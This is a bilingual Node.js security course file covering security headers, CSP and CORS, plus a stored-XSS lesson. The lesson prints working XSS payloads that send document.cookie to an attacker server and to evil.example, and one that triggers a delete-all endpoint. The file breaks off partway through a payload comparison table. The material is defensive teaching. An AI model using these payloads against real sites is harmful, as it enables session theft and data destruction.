/**
 * Node.js — Chương 9: Bảo mật ứng dụng.
 * Mọi output là đo thật: Node v22.21.0, express 5.2.1, helmet 8.3.0, cors 2.8.6,
 * sanitize-html 2.17.6, dompurify 3.4.12 + jsdom 29.1.1, jsonwebtoken 9.0.3.
 * Header production lấy bằng curl thật trên https://cuongthai.com (27/07/2026).
 */
const REF = '?ref=%2Fcourses%2Fnodejs%2Flearn&reflabel=Node.js';

export default {
  title: 'Chapter 9 — Application security|||Chương 9 — Bảo mật ứng dụng',
  description: 'Header bảo mật và CSP, CORS hiểu cho đúng, XSS lưu trữ tái hiện end-to-end bằng một trình duyệt thật, ReDoS và ô nhiễm nguyên mẫu, SSRF, và cách giữ bí mật trong một dự án có 183 gói phụ thuộc.',
  lessons: [
    /* ─────────────────────────── 9.1 ─────────────────────────── */
    {
      title: '9.1 — The perimeter: security headers, CSP and CORS|||9.1 — Đường biên: header bảo mật, CSP và CORS',
      slug: 'nodejs-9-1-header-csp-cors',
      type: 'VIDEO',
      description: 'Đo chính xác helmet thêm gì vào phản hồi, đọc CSP thật của cuongthai.com từng chỉ thị, và chứng minh CORS không hề bảo vệ máy chủ của bạn.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 9 · Lesson 9.1</span>
<h2>The perimeter: security headers, CSP and CORS</h2>
<p class="lead">Chapter 8 answered "who is this request from". This chapter answers a harder question: what happens when the request is genuinely from your user, and the danger is what the user's browser was tricked into doing on their behalf. That is where headers live. A response header is not decoration — it is an instruction you send to a browser you do not control, and it is the only lever you have over what that browser will do with your page afterwards.</p>

<h3>Start by looking at what you already send</h3>
<p>A bare Express 5 app, no middleware, one JSON route. This is the entire response header set:</p>
<pre><code><span class="tok-kw">const</span> app = express();
app.get(<span class="tok-str">'/'</span>, (req, res) =&gt; res.json({ ok: <span class="tok-kw">true</span> }));
app.listen(<span class="tok-num">4101</span>);</code></pre>
<div class="out">connection: keep-alive
content-length: 11
content-type: application/json; charset=utf-8
date: Mon, 27 Jul 2026 17:45:46 GMT
etag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
keep-alive: timeout=5
x-powered-by: Express</div>
<p>Seven headers, and one of them actively works against you: <code>x-powered-by: Express</code> tells anyone scanning your host which framework to look up CVEs for. It costs nothing to remove and it is the cheapest possible win.</p>

<h3>Measurement 1 — exactly what helmet does</h3>
<p>Same app, one line added: <code>app.use(helmet())</code>. Diffing the two responses on the same machine, same second:</p>
<div class="out">helmet THÊM: content-security-policy, cross-origin-opener-policy,
             cross-origin-resource-policy, origin-agent-cluster, referrer-policy,
             strict-transport-security, x-content-type-options,
             x-dns-prefetch-control, x-download-options, x-frame-options,
             x-permitted-cross-domain-policies, x-xss-protection
helmet BỎ  : x-powered-by</div>
<p>Twelve headers added, one removed, for one line of code and zero measurable latency. Here is the full set as it goes out on the wire, so you can read the actual values rather than trust a summary:</p>
<div class="out">content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;
  form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';
  script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';
  upgrade-insecure-requests
cross-origin-opener-policy: same-origin
cross-origin-resource-policy: same-origin
origin-agent-cluster: ?1
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
x-dns-prefetch-control: off
x-download-options: noopen
x-frame-options: SAMEORIGIN
x-permitted-cross-domain-policies: none
x-xss-protection: 0</div>

<h3>The five that actually matter</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">strict-transport-security</span><span class="v">"For the next 31,536,000 seconds, never talk to this host over plain HTTP — not even if the user types <code>http://</code>." Kills the downgrade attack where an attacker on the same Wi-Fi intercepts the first, unencrypted request.</span></div>
  <div class="kv"><span class="k">x-content-type-options: nosniff</span><span class="v">"Believe my Content-Type; do not guess." Without it a browser may decide your uploaded <code>.txt</code> looks like HTML and execute it as a page.</span></div>
  <div class="kv"><span class="k">x-frame-options / frame-ancestors</span><span class="v">Stops clickjacking: your real page loaded inside an invisible iframe on an attacker's site, with a fake button positioned over your "Delete account".</span></div>
  <div class="kv"><span class="k">referrer-policy</span><span class="v">Controls how much of your URL leaks to third parties. A URL like <code>/reset-password?token=…</code> sent as a Referer to an analytics script is a real account takeover.</span></div>
  <div class="kv"><span class="k">content-security-policy</span><span class="v">The only one on this list that can stop an XSS you already have in your database. Everything else on this list makes a specific attack harder; CSP changes what an injected script is <em>allowed to do</em>.</span></div>
</div>

<div class="callout">Notice <code>x-xss-protection: 0</code> — helmet deliberately turns the old "XSS auditor" <strong>off</strong>. That header controlled a legacy browser heuristic that was itself exploitable and has been removed from every modern browser. Setting it to <code>1</code> because it sounds protective is a small step backwards; helmet sending <code>0</code> is the correct modern value.</div>

<h3>CSP, read one directive at a time</h3>
<p>CSP is a list of "where is it legal for this page to load X from". This is the policy cuongthai.com actually serves today, fetched with <code>curl -sI https://cuongthai.com</code>, trimmed to the shape rather than every domain:</p>
<div class="out">default-src 'self';
script-src  'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://www.youtube.com;
style-src   'self' 'unsafe-inline';
img-src     'self' data: blob: https://media.cuongthai.com https://*.giphy.com …;
connect-src 'self' wss://cuongthai.com https://api.cuongthai.com https://*.sentry.io …;
frame-src   'self' blob: https://www.youtube.com https://challenges.cloudflare.com …;
object-src  'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';
upgrade-insecure-requests</div>
<div class="lz-map">
  <div class="lz-node"><span class="lz-t">default-src 'self'</span><span class="lz-d">the fallback for everything not named below: only this origin</span></div>
  <div class="lz-node"><span class="lz-t">script-src</span><span class="lz-d">where JavaScript may come from — the directive that decides whether an injected <code>&lt;script src&gt;</code> runs</span></div>
  <div class="lz-node"><span class="lz-t">connect-src</span><span class="lz-d">where fetch/XHR/WebSocket may go — the directive that decides whether stolen data can be sent out</span></div>
  <div class="lz-node"><span class="lz-t">object-src 'none'</span><span class="lz-d">no Flash/applet embeds, ever — free, breaks nothing in 2026</span></div>
  <div class="lz-node"><span class="lz-t">frame-ancestors 'self'</span><span class="lz-d">the modern replacement for X-Frame-Options</span></div>
</div>
<p>Two honest observations about that real policy. First, <code>script-src</code> contains <code>'unsafe-inline' 'unsafe-eval'</code> — that is the price of a Next.js app with inline hydration payloads, and it means CSP here is a <em>second</em> line of defence, not a magic shield. Second, <code>img-src</code> is a long explicit allow-list, which is exactly why an image hosted on a CDN that is not listed silently fails to render — the cause of a real bug on this site when course covers were briefly served from an external CDN.</p>

<div class="pitfall">
<p><strong>helmet's default CSP will break your app the moment you serve HTML.</strong> <code>script-src 'self'</code> blocks every inline <code>&lt;script&gt;</code> — including framework hydration and analytics snippets. Symptom: a blank page and a console full of "Refused to execute inline script". The fix is not to delete CSP; it is to configure it, or to let the layer that renders HTML own it. On this project the backend sets <code>contentSecurityPolicy: false</code> in helmet precisely because Next.js emits the page-level policy.</p>
</div>

<h3>Same-Origin Policy, and what CORS actually relaxes</h3>
<p>By default a browser lets a page at <code>https://evil.example</code> <em>send</em> a request to your API but not <em>read</em> the response. CORS is the mechanism by which your server says "this particular origin may read my responses". Four configurations, probed with the same request carrying <code>Origin: https://evil.example</code>:</p>
<div class="out">--- KHÔNG cấu hình CORS ---
  GET  200  ACAO=null  ACAC=null  Vary=null
  OPTIONS(preflight) 200  ACAO=null  methods=null

--- cors({ origin: true, credentials: true })  ← phản chiếu ---
  GET  200  ACAO=https://evil.example  ACAC=true  Vary=Origin
  OPTIONS(preflight) 204  ACAO=https://evil.example  methods=GET,HEAD,PUT,PATCH,POST,DELETE

--- cors({ origin: '*', credentials: true }) ---
  GET  200  ACAO=*  ACAC=true  Vary=null

--- cors({ origin: ['https://cuongthai.com'] })  ← danh sách trắng ---
  GET  200  ACAO=null  ACAC=true  Vary=Origin
  danh sách trắng + Origin ĐÚNG → ACAO=https://cuongthai.com</div>
<p>Read the second block again. <code>origin: true</code> means "reflect whatever origin asked" — combined with <code>credentials: true</code> it tells the browser that <em>any</em> website may make authenticated requests to your API and read the answers. It is the single most common CORS mistake, it passes every local test, and it hands your entire authenticated API to any page your user happens to have open.</p>
<p>The third block is broken in a different way: <code>Access-Control-Allow-Origin: *</code> together with credentials is explicitly forbidden by the spec, so the browser refuses the response. Your server thinks it is permissive; the browser treats it as an error. You get bug reports about "CORS errors" that no amount of adding origins will fix.</p>

<h3>Measurement 2 — the thing nobody tells you about CORS</h3>
<p>A server with <strong>no CORS configuration at all</strong>, and a POST arriving with an attacker's Origin:</p>
<pre><code>console.log(<span class="tok-str">'số dư trước :'</span>, balance);
<span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4201/transfer'</span>, {
  method: <span class="tok-str">'POST'</span>, headers: { Origin: <span class="tok-str">'https://evil.example'</span> }, body: <span class="tok-str">'{}'</span> });
console.log(<span class="tok-str">'số dư sau   :'</span>, balance);</code></pre>
<div class="out">số dư trước : 1000
POST /transfer từ Origin evil.example, máy chủ KHÔNG cấu hình CORS → 200 {"balance":900}
số dư sau   : 900  ← tiền đã đi rồi</div>
<p><strong>CORS is not authorization.</strong> It is a rule enforced by browsers about who may <em>read</em> a response. The request still arrived, still ran, still changed state. Anything that is not a browser — curl, a script, a mobile app, another server — ignores CORS completely. If your reasoning ever contains "that endpoint is safe because CORS", replace it with authentication and a CSRF defence (lesson 8.4).</p>
<div class="callout warn"><p>The same logic explains a confusing symptom: with a whitelist configured, a rejected origin still receives <code>204</code> on the preflight — look at the fourth block, <code>ACAO=null</code> but the status is not an error. The <em>server</em> answered fine; the <em>browser</em> is the component that decides to block. Do not go looking for a 403 that will never come.</p>
</div>

<h3>One header you must not forget: Vary</h3>
<p>Notice <code>Vary: Origin</code> appears whenever the policy depends on the request's origin. Without it, any cache in front of you — nginx, a CDN, the browser's own cache — may store the response it got for <code>cuongthai.com</code> and hand it to a request from a different origin, or the other way round. The <code>cors</code> package sets it for you; hand-rolled CORS middleware usually does not, and the bug appears only under caching, in production.</p>

<div class="note-ct">
<p><strong>How cuongthai.com is configured</strong> (<code>src/index.ts</code>, in order): request-id middleware → <code>helmet({ crossOriginResourcePolicy: 'cross-origin', contentSecurityPolicy: false, crossOriginEmbedderPolicy: false })</code> → CORS with an explicit allow-list of <code>https://cuongthai.com</code>, <code>https://www.cuongthai.com</code>, <code>http://localhost:3000</code> plus a CSV env var <code>CORS_ORIGINS</code>, <code>credentials: true</code>, <code>maxAge: 86400</code> → body parsers. Three details worth copying: the <code>www.</code> variant is in the list on purpose because bookmarks include it and the failure mode is a useless "fetch failed" in the console; a request with <strong>no</strong> Origin header (curl, server-to-server) is allowed through and left to the auth middleware; and every rejected origin is logged with <code>logger.warn('CORS rejected origin')</code> so ops can see what is actually being blocked. CSP is <code>false</code> here because Next.js emits the page policy you saw above — one owner per header.</p>
</div>

<div class="pitfall">
<p><strong>Order matters and it is easy to get wrong.</strong> <code>helmet()</code> and <code>cors()</code> only affect responses that pass <em>through</em> them. Mount them before your routes, and mount your error handler last — otherwise an error response can go out with none of these headers, which is precisely the response most likely to contain something sensitive.</p>
</div>

<a class="link-card codelab" href="/code-lab/nodejs-express${REF}#module-323" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 323 — Authentication, Authorization, and Security</span><span class="lc-sub">10 bài tập: header bảo mật, CORS, và các lớp phòng thủ của một API Express.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/nginx${REF}#module-915" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 915 — Nginx Security Hardening</span><span class="lc-sub">10 bài tập: đặt header ở tầng proxy, TLS, và chặn ở vòng ngoài.</span></span>
</a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 9 · Bài 9.1</span>
<h2>Đường biên: header bảo mật, CSP và CORS</h2>
<p class="lead">Chương 8 trả lời câu "request này của ai". Chương này trả lời một câu khó hơn: chuyện gì xảy ra khi request đúng là của người dùng thật của bạn, còn mối nguy nằm ở chỗ trình duyệt của họ bị lừa làm việc đó thay họ. Đó là địa bàn của header. Một response header không phải đồ trang trí — nó là mệnh lệnh bạn gửi cho một trình duyệt mà bạn không kiểm soát, và là đòn bẩy duy nhất bạn có với những gì trình duyệt đó làm với trang của bạn sau khi nhận.</p>

<h3>Bắt đầu bằng việc nhìn xem bạn đang gửi cái gì</h3>
<p>Một app Express 5 trần, không middleware, một route JSON. Đây là TOÀN BỘ tập header của phản hồi:</p>
<pre><code><span class="tok-kw">const</span> app = express();
app.get(<span class="tok-str">'/'</span>, (req, res) =&gt; res.json({ ok: <span class="tok-kw">true</span> }));
app.listen(<span class="tok-num">4101</span>);</code></pre>
<div class="out">connection: keep-alive
content-length: 11
content-type: application/json; charset=utf-8
date: Mon, 27 Jul 2026 17:45:46 GMT
etag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
keep-alive: timeout=5
x-powered-by: Express</div>
<p>Bảy header, và một trong số đó đang làm hại bạn: <code>x-powered-by: Express</code> nói cho bất kỳ ai quét máy chủ của bạn biết nên tra CVE của framework nào. Bỏ nó đi không tốn gì cả và là món hời rẻ nhất có thể có.</p>

<h3>Phép đo 1 — helmet làm chính xác những gì</h3>
<p>Cùng app đó, thêm đúng một dòng <code>app.use(helmet())</code>. So chênh lệch hai phản hồi trên cùng một máy, cùng một giây:</p>
<div class="out">helmet THÊM: content-security-policy, cross-origin-opener-policy,
             cross-origin-resource-policy, origin-agent-cluster, referrer-policy,
             strict-transport-security, x-content-type-options,
             x-dns-prefetch-control, x-download-options, x-frame-options,
             x-permitted-cross-domain-policies, x-xss-protection
helmet BỎ  : x-powered-by</div>
<p>Mười hai header được thêm, một cái bị bỏ, đổi lại một dòng code và độ trễ không đo được. Đây là toàn bộ giá trị thật đi trên dây, để bạn đọc giá trị chứ không tin bản tóm tắt:</p>
<div class="out">content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;
  form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';
  script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';
  upgrade-insecure-requests
cross-origin-opener-policy: same-origin
cross-origin-resource-policy: same-origin
origin-agent-cluster: ?1
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
x-dns-prefetch-control: off
x-download-options: noopen
x-frame-options: SAMEORIGIN
x-permitted-cross-domain-policies: none
x-xss-protection: 0</div>

<h3>Năm cái thật sự quan trọng</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">strict-transport-security</span><span class="v">"Trong 31.536.000 giây tới, đừng bao giờ nói chuyện với host này qua HTTP thường — kể cả khi người dùng gõ <code>http://</code>." Chặn đòn hạ cấp giao thức, khi kẻ tấn công cùng mạng Wi-Fi chặn đúng request đầu tiên chưa mã hoá.</span></div>
  <div class="kv"><span class="k">x-content-type-options: nosniff</span><span class="v">"Hãy tin Content-Type của tôi, đừng đoán." Không có nó, trình duyệt có thể tự kết luận file <code>.txt</code> người dùng tải lên trông giống HTML rồi chạy nó như một trang web.</span></div>
  <div class="kv"><span class="k">x-frame-options / frame-ancestors</span><span class="v">Chặn clickjacking: trang thật của bạn bị nhúng trong một iframe trong suốt trên site của kẻ tấn công, với một nút giả đặt chồng lên đúng chỗ nút "Xoá tài khoản".</span></div>
  <div class="kv"><span class="k">referrer-policy</span><span class="v">Quyết định URL của bạn rò ra ngoài bao nhiêu. Một URL kiểu <code>/reset-password?token=…</code> bị gửi kèm làm Referer sang script analytics là một vụ chiếm tài khoản thật sự.</span></div>
  <div class="kv"><span class="k">content-security-policy</span><span class="v">Cái duy nhất trong danh sách này có thể chặn một lỗ XSS ĐÃ nằm sẵn trong cơ sở dữ liệu của bạn. Những cái khác làm một đòn tấn công cụ thể khó hơn; CSP thay đổi việc một script bị chèn <em>được phép làm gì</em>.</span></div>
</div>

<div class="callout">Để ý <code>x-xss-protection: 0</code> — helmet cố tình <strong>TẮT</strong> cái "bộ kiểm XSS" cũ. Header đó điều khiển một cơ chế phỏng đoán đời cũ của trình duyệt, bản thân nó từng bị lợi dụng để tấn công và đã bị gỡ khỏi mọi trình duyệt hiện đại. Đặt nó bằng <code>1</code> vì nghe có vẻ "bảo vệ" là một bước lùi nhỏ; helmet gửi <code>0</code> mới là giá trị đúng của thời nay.</div>

<h3>Đọc CSP, từng chỉ thị một</h3>
<p>CSP là danh sách "trang này được phép nạp X từ đâu". Đây là chính sách mà cuongthai.com đang phục vụ hôm nay, lấy bằng <code>curl -sI https://cuongthai.com</code>, đã rút gọn phần liệt kê tên miền để nhìn ra hình dạng:</p>
<div class="out">default-src 'self';
script-src  'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://www.youtube.com;
style-src   'self' 'unsafe-inline';
img-src     'self' data: blob: https://media.cuongthai.com https://*.giphy.com …;
connect-src 'self' wss://cuongthai.com https://api.cuongthai.com https://*.sentry.io …;
frame-src   'self' blob: https://www.youtube.com https://challenges.cloudflare.com …;
object-src  'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';
upgrade-insecure-requests</div>
<div class="lz-map">
  <div class="lz-node"><span class="lz-t">default-src 'self'</span><span class="lz-d">giá trị dự phòng cho mọi thứ không được nêu tên bên dưới: chỉ origin này</span></div>
  <div class="lz-node"><span class="lz-t">script-src</span><span class="lz-d">JavaScript được đến từ đâu — chỉ thị quyết định một thẻ <code>&lt;script src&gt;</code> bị chèn có chạy hay không</span></div>
  <div class="lz-node"><span class="lz-t">connect-src</span><span class="lz-d">fetch/XHR/WebSocket được đi đến đâu — chỉ thị quyết định dữ liệu ăn cắp được có gửi ra ngoài được không</span></div>
  <div class="lz-node"><span class="lz-t">object-src 'none'</span><span class="lz-d">cấm nhúng Flash/applet, vĩnh viễn — miễn phí, năm 2026 không làm hỏng thứ gì</span></div>
  <div class="lz-node"><span class="lz-t">frame-ancestors 'self'</span><span class="lz-d">bản thay thế hiện đại của X-Frame-Options</span></div>
</div>
<p>Hai nhận xét thành thật về chính sách thật đó. Thứ nhất, <code>script-src</code> có <code>'unsafe-inline' 'unsafe-eval'</code> — đó là cái giá của một app Next.js với phần hydration nội tuyến, nghĩa là CSP ở đây là tuyến phòng thủ <em>thứ hai</em>, không phải tấm khiên thần kỳ. Thứ hai, <code>img-src</code> là một danh sách trắng dài và tường minh, và đó chính xác là lý do một ảnh đặt trên CDN không nằm trong danh sách sẽ lặng lẽ không hiện — đúng một lỗi có thật trên site này khi ảnh bìa khoá học có lúc được phục vụ từ CDN ngoài.</p>

<div class="pitfall">
<p><strong>CSP mặc định của helmet sẽ làm hỏng app của bạn ngay khi bạn phục vụ HTML.</strong> <code>script-src 'self'</code> chặn mọi <code>&lt;script&gt;</code> nội tuyến — kể cả phần hydration của framework và đoạn nhúng analytics. Triệu chứng: trang trắng và console đầy dòng "Refused to execute inline script". Cách sửa không phải là xoá CSP, mà là cấu hình nó, hoặc để tầng nào render HTML thì tầng đó sở hữu nó. Ở dự án này backend đặt <code>contentSecurityPolicy: false</code> trong helmet đúng vì Next.js mới là nơi phát ra chính sách cấp trang.</p>
</div>

<h3>Same-Origin Policy, và CORS thật ra nới lỏng cái gì</h3>
<p>Mặc định, trình duyệt cho phép một trang ở <code>https://evil.example</code> <em>gửi</em> request tới API của bạn nhưng không cho <em>đọc</em> phản hồi. CORS là cơ chế để máy chủ của bạn nói "riêng origin này được đọc phản hồi của tôi". Bốn cấu hình, cùng một request mang <code>Origin: https://evil.example</code>:</p>
<div class="out">--- KHÔNG cấu hình CORS ---
  GET  200  ACAO=null  ACAC=null  Vary=null
  OPTIONS(preflight) 200  ACAO=null  methods=null

--- cors({ origin: true, credentials: true })  ← phản chiếu ---
  GET  200  ACAO=https://evil.example  ACAC=true  Vary=Origin
  OPTIONS(preflight) 204  ACAO=https://evil.example  methods=GET,HEAD,PUT,PATCH,POST,DELETE

--- cors({ origin: '*', credentials: true }) ---
  GET  200  ACAO=*  ACAC=true  Vary=null

--- cors({ origin: ['https://cuongthai.com'] })  ← danh sách trắng ---
  GET  200  ACAO=null  ACAC=true  Vary=Origin
  danh sách trắng + Origin ĐÚNG → ACAO=https://cuongthai.com</div>
<p>Đọc lại khối thứ hai. <code>origin: true</code> nghĩa là "phản chiếu lại bất kỳ origin nào hỏi" — cộng với <code>credentials: true</code> nó nói với trình duyệt rằng <em>bất kỳ</em> website nào cũng được gọi API của bạn kèm thông tin đăng nhập và đọc câu trả lời. Đây là lỗi CORS phổ biến nhất, nó qua mọi bài test cục bộ, và nó dâng toàn bộ API đã xác thực của bạn cho bất kỳ trang nào người dùng đang mở.</p>
<p>Khối thứ ba hỏng theo kiểu khác: <code>Access-Control-Allow-Origin: *</code> đi cùng credentials bị chuẩn cấm tường minh, nên trình duyệt từ chối phản hồi. Máy chủ của bạn tưởng mình đang dễ tính; trình duyệt coi đó là lỗi. Kết quả là bạn nhận báo lỗi "lỗi CORS" mà thêm bao nhiêu origin cũng không sửa được.</p>

<h3>Phép đo 2 — điều không ai nói với bạn về CORS</h3>
<p>Một máy chủ <strong>hoàn toàn không cấu hình CORS</strong>, và một POST đến kèm Origin của kẻ tấn công:</p>
<pre><code>console.log(<span class="tok-str">'số dư trước :'</span>, balance);
<span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4201/transfer'</span>, {
  method: <span class="tok-str">'POST'</span>, headers: { Origin: <span class="tok-str">'https://evil.example'</span> }, body: <span class="tok-str">'{}'</span> });
console.log(<span class="tok-str">'số dư sau   :'</span>, balance);</code></pre>
<div class="out">số dư trước : 1000
POST /transfer từ Origin evil.example, máy chủ KHÔNG cấu hình CORS → 200 {"balance":900}
số dư sau   : 900  ← tiền đã đi rồi</div>
<p><strong>CORS không phải là phân quyền.</strong> Nó là một luật do TRÌNH DUYỆT thi hành về việc ai được <em>đọc</em> phản hồi. Request vẫn đến nơi, vẫn chạy, vẫn đổi trạng thái. Bất cứ thứ gì không phải trình duyệt — curl, một script, app di động, một máy chủ khác — bỏ qua CORS hoàn toàn. Nếu lập luận của bạn có câu "endpoint đó an toàn vì có CORS", hãy thay nó bằng xác thực và một lớp chống CSRF (bài 8.4).</p>
<div class="callout warn"><p>Cũng logic đó giải thích một triệu chứng gây bối rối: khi đã cấu hình danh sách trắng, một origin bị từ chối vẫn nhận <code>204</code> ở bước preflight — nhìn khối thứ tư, <code>ACAO=null</code> nhưng mã trạng thái không phải lỗi. <em>Máy chủ</em> trả lời bình thường; <em>trình duyệt</em> mới là thành phần quyết định chặn. Đừng đi tìm một mã 403 sẽ không bao giờ tới.</p>
</div>

<h3>Một header không được quên: Vary</h3>
<p>Để ý <code>Vary: Origin</code> xuất hiện mỗi khi chính sách phụ thuộc vào origin của request. Không có nó, mọi tầng cache đứng trước bạn — nginx, một CDN, chính cache của trình duyệt — đều có thể lưu phản hồi nhận được cho <code>cuongthai.com</code> rồi đưa nó cho một request từ origin khác, hoặc ngược lại. Gói <code>cors</code> tự đặt header này; middleware CORS viết tay thường thì không, và lỗi chỉ lộ ra khi có cache, tức là trên production.</p>

<div class="note-ct">
<p><strong>cuongthai.com cấu hình thế nào</strong> (<code>src/index.ts</code>, theo đúng thứ tự): middleware gắn request-id → <code>helmet({ crossOriginResourcePolicy: 'cross-origin', contentSecurityPolicy: false, crossOriginEmbedderPolicy: false })</code> → CORS với danh sách trắng tường minh gồm <code>https://cuongthai.com</code>, <code>https://www.cuongthai.com</code>, <code>http://localhost:3000</code> cộng thêm biến môi trường CSV <code>CORS_ORIGINS</code>, <code>credentials: true</code>, <code>maxAge: 86400</code> → các body parser. Ba chi tiết đáng chép lại: biến thể <code>www.</code> nằm trong danh sách một cách cố ý vì người dùng có bookmark như vậy và kiểu hỏng của nó là một dòng "fetch failed" vô dụng trong console; request <strong>không</strong> có header Origin (curl, máy chủ gọi máy chủ) được cho qua và để middleware xác thực quyết định; và mọi origin bị từ chối đều được ghi log bằng <code>logger.warn('CORS rejected origin')</code> để bộ phận vận hành nhìn được thứ gì đang thực sự bị chặn. CSP để <code>false</code> ở đây vì Next.js mới là nơi phát chính sách cấp trang mà bạn vừa đọc ở trên — mỗi header chỉ nên có một chủ sở hữu.</p>
</div>

<div class="pitfall">
<p><strong>Thứ tự có ý nghĩa và rất dễ đặt sai.</strong> <code>helmet()</code> và <code>cors()</code> chỉ tác động tới những phản hồi đi <em>qua</em> chúng. Hãy gắn chúng TRƯỚC các route, và gắn error handler CUỐI CÙNG — nếu không, một phản hồi lỗi có thể bay ra mà không mang header nào trong số này, mà đó lại đúng là loại phản hồi dễ chứa thông tin nhạy cảm nhất.</p>
</div>

<a class="link-card codelab" href="/code-lab/nodejs-express${REF}#module-323" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 323 — Authentication, Authorization, and Security</span><span class="lc-sub">10 bài tập: header bảo mật, CORS, và các lớp phòng thủ của một API Express.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/nginx${REF}#module-915" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 915 — Nginx Security Hardening</span><span class="lc-sub">10 bài tập: đặt header ở tầng proxy, TLS, và chặn ở vòng ngoài.</span></span>
</a>
</div>
`,
    },
    /* ─────────────────────────── 9.2 ─────────────────────────── */
    {
      title: '9.2 — XSS: from a stranger\'s note to your session|||9.2 — XSS: từ ghi chú của người lạ tới phiên đăng nhập của bạn',
      slug: 'nodejs-9-2-xss-va-sanitize',
      type: 'VIDEO',
      description: 'Tái hiện stored XSS end-to-end bằng một trình duyệt thật, đo chín payload qua năm cách lọc, và quyết định escape hay sanitize, ở tầng nào.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 9 · Lesson 9.2</span>
<h2>XSS: from a stranger's note to your session</h2>
<p class="lead">Cross-site scripting is the vulnerability people underestimate most, because the name sounds like a browser problem and the demo everyone has seen is <code>alert(1)</code>. It is not a browser problem — it is your backend storing text and your frontend running it. And it does not end at a popup: an injected script runs <em>inside your user's session</em>, with their cookies, their permissions and their CSRF tokens. Everything that user can do, the script can do.</p>

<h3>Three flavours, one root cause</h3>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">Stored</span><span class="lz-d">the payload lives in your database — a note, a comment, a display name — and fires for every visitor who loads the page</span></div>
  <div class="lz-step"><span class="lz-t">Reflected</span><span class="lz-d">the payload rides in the URL and is echoed back into the page: <code>/search?q=…</code>. Needs the victim to click a link</span></div>
  <div class="lz-step"><span class="lz-t">DOM-based</span><span class="lz-d">the server is innocent; client JavaScript writes untrusted data into <code>innerHTML</code></span></div>
</div>
<p>One root cause behind all three: <strong>data crossed a boundary into a context where it is read as code</strong>. Stored XSS is the worst of the three because it needs no link, no social engineering and no interaction — the victim visits a page they visit every day.</p>

<h3>Measurement 1 — a stored XSS, end to end, with a real browser</h3>
<p>Nothing simulated here. There are three processes: an attacker's server on port 4302 that logs whatever reaches it, a Notes feed on 4301 that renders stored notes, and a victim — a real DOM implementation (jsdom) that parses the HTML and <em>executes the scripts inside it</em>. The attacker posts one note:</p>
<pre><code><span class="tok-kw">const</span> PAYLOAD = <span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
  x.open('GET','http://127.0.0.1:4302/steal?c='+encodeURIComponent(document.cookie));
  x.send()&lt;/script&gt;&#96;</span>;
<span class="tok-kw">await</span> fetch(<span class="tok-str">'http://127.0.0.1:4301/notes'</span>, { method: <span class="tok-str">'POST'</span>,
  headers: { <span class="tok-str">'content-type'</span>: <span class="tok-str">'application/json'</span> }, body: JSON.stringify({ body: PAYLOAD }) });</code></pre>
<p>Then the victim — logged in, with a session cookie — opens the feed. Three runs, changing one thing at a time:</p>
<div class="out">=== Stored XSS: ghi chú của kẻ tấn công nằm trong bảng tin của mọi người ===
1) hiển thị thô, cookie KHÔNG httpOnly
   → máy chủ kẻ tấn công nhận được: ["session=eyJhbGciOi.NGUOI-DUNG-AN"]
2) hiển thị thô, cookie CÓ httpOnly
   → máy chủ kẻ tấn công nhận được: [""]
3) sanitize-html + httpOnly
   → máy chủ kẻ tấn công nhận được: (không có gì)</div>
<p>Run 1 is a full account takeover: the attacker's server now holds a valid session token belonging to a user who did nothing but load a page. Run 2 shows exactly what <code>httpOnly</code> buys — the script still ran, it just found an empty string in <code>document.cookie</code>. Run 3 is the actual fix: the payload never became a <code>&lt;script&gt;</code> element at all, so nothing was sent.</p>

<h3>httpOnly is not a fix, and here is the proof</h3>
<p>Same victim, same httpOnly cookie, one different payload — this one does not read the cookie, it simply <em>uses</em> it:</p>
<pre><code><span class="tok-str">&#96;&lt;script&gt;var x=new XMLHttpRequest();
  x.open('POST','/notes/delete-all'); x.send()&lt;/script&gt;&#96;</span></code></pre>
<div class="out">4) cookie httpOnly, payload KHÔNG đọc cookie mà tự gọi API:
   /notes/delete-all được gọi 1 lần  ← XSS = chạy code TRONG phiên của nạn nhân</div>
<p>The browser attached the session cookie automatically, because the request goes to the same origin the page came from. The data is gone. <code>httpOnly</code> reduces the blast radius of an XSS; it does not contain it. The only real fix is upstream: the payload must never reach the DOM as markup.</p>

<h3>Measurement 2 — nine payloads, five strategies</h3>
<p>Escaping, a home-made regex filter (<code>replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, '')</code>), <code>sanitize-html</code> with an explicit allow-list, and <code>DOMPurify</code> with defaults. Trimmed to the interesting rows:</p>
<div class="out">■ img onerror (ăn cookie)
  vào       : &lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;
  escape    : &amp;lt;img src=x onerror=&amp;quot;fetch(…
